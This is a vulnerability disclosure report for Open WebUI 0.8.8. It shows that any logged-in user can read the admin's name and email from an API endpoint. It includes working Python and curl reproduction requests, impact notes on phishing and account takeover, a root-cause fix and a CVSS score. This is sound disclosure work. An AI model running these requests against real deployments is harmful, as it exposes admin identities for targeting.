# Open WebUI — Admin Information Disclosure via `/auths/admin/details`

**Target:** open-webui/open-webui
**Version:** 0.8.8
**Date:** March 2026
**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

---

## Summary

The endpoint `GET /api/v1/auths/admin/details` returns the admin account's name and email address to **any authenticated user**, regardless of role. No admin privileges are required.

---

## Reproduction

```python
import requests

BASE = "http://localhost:3000"

# Login as regular user (not admin)
r = requests.post(f"{BASE}/api/v1/auths/signin",
    json={"email": "user@local.test", "password": "User2024"})
token = r.json()["token"]

# Access admin details — should require admin role
r2 = requests.get(f"{BASE}/api/v1/auths/admin/details",
    headers={"Authorization": f"Bearer {token}"})

print(r2.status_code)   # 200
print(r2.json())        # {'name': 'Admin Name', 'email': 'admin@example.com'}
```

```bash
# With curl — any valid user token works
TOKEN=$(curl -s -X POST http://TARGET:3000/api/v1/auths/signin \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"userpass"}' | jq -r .token)

curl http://TARGET:3000/api/v1/auths/admin/details \
  -H "Authorization: Bearer $TOKEN"
# → {"name": "Admin", "email": "admin@example.com"}
```

---

## Test Results

| Requester | Status | Response |
|-----------|--------|----------|
| Admin user | 200 | `{"name": "...", "email": "..."}` |
| Regular user | 200 ✗ | `{"name": "...", "email": "..."}` |
| Unauthenticated | 401 | Blocked |

---

## Impact

1. **Admin email enumeration** — any registered user learns the admin's email address
2. **Targeted phishing/social engineering** — attacker knows exactly who to impersonate
3. **Account takeover preparation** — admin email used for password reset attacks
4. **Multi-tenant risk** — in shared Open WebUI deployments, all users see the admin identity

---

## Root Cause

The FastAPI route likely lacks the `role="admin"` check in its dependency:

```python
# Likely current (vulnerable):
@router.get("/admin/details")
async def get_admin_details(user=Depends(get_verified_user)):
    ...

# Should be:
@router.get("/admin/details")
async def get_admin_details(user=Depends(get_admin_user)):
    ...
```

**File:** `backend/open_webui/routers/auths.py`

---

## CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` = **4.3 Medium**

- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (any valid account)
- User Interaction: None
- Confidentiality: Low
- Integrity: None
- Availability: None

---

## Environment

- **OS:** macOS Darwin 25.3.0 (Apple M4)
- **Open WebUI:** 0.8.8 (pip install)
- **Network:** localhost only
